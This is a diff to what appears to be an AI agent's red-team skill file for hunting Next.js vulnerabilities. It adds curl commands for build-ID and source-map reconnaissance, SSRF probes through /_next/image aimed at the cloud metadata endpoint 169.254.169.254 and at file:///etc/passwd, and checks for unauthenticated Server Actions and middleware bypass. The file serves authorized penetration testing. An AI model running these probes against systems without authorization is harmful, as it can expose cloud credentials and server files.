@@ -4,11 +4,51 @@ description: Hunt Next.js specific vulnerabilities — Server Actions arbitrary 
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [nextjs, hunt, redteam, javascript]
+platforms: [linux]
+metadata:
+  tags: [nextjs, hunt, redteam, javascript]
+  category: redteam
 ---
 
 # HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities
+
+## When to Use
+
+- Target runs Next.js 13/14/15 or any React SSR framework.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Confirm Next.js and get build ID
+curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"buildId":"[^"]+"'
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"
+
+# Extract build ID for /_next/data/ paths
+BUILD_ID=$(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Po '"buildId":"\K[^"]+')
+echo "Build ID: $BUILD_ID"
+
+# Check Next.js version via package disclosure
+curl --max-time 30 --connect-timeout 10 -s https://$TARGET/_next/static/chunks/framework*.js | grep -Eo '"next":"[^"]+"'
+
+# Source map exposure
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -45,7 +85,7 @@ curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"buildId
 curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"
 
 # Extract build ID for /_next/data/ paths
-BUILD_ID=$(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"buildId":"\K[^"]+')
+BUILD_ID=$(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Po '"buildId":"\K[^"]+')
 echo "Build ID: $BUILD_ID"
 
 # Check Next.js version via package disclosure
@@ -104,7 +144,7 @@ curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/data/$BUILD_ID
 
 ```bash
 # Basic SSRF test — internal metadata
-curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=http://[REDACTED_IP]/latest/meta-data/&w=64&q=75"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
 
 # Protocol bypass attempts
 curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
@@ -235,8 +275,15 @@ if m:
 
 ---
 
-## Validation
+## Pitfalls
+- **Next.js source maps in production** — `.map` files in `/_next/` are information disclosure (source code visibility), not RCE.
+- **_next/data endpoint enumeration** — build ID + data endpoints expose server-side props. Test if sensitive data passes through getServerSideProps.
+- **Middleware bypass** — Next.js middleware runs on Edge. Test if `/api/` paths bypass middleware via direct access.
+- **ISR cache poisoning** — Incremental Static Regeneration can be poisoned if revalidation triggers are controllable.
 
+---
+
+## Verification
 ✅ Server Action: action executes without valid session, returns data or mutates state
 ✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
 ✅ Middleware bypass: 200 response on protected route without auth cookie
@@ -249,33 +296,3 @@ if m:
 - Source map exposure only: Low-Medium
 
 ---
-
-## Verification
-
-Run this self-test to confirm nextjs hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-nextjs" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
-## Pitfalls
-- **Next.js source maps in production** — `.map` files in `/_next/` are information disclosure (source code visibility), not RCE.
-- **_next/data endpoint enumeration** — build ID + data endpoints expose server-side props. Test if sensitive data passes through getServerSideProps.
-- **Middleware bypass** — Next.js middleware runs on Edge. Test if `/api/` paths bypass middleware via direct access.
-- **ISR cache poisoning** — Incremental Static Regeneration can be poisoned if revalidation triggers are controllable.
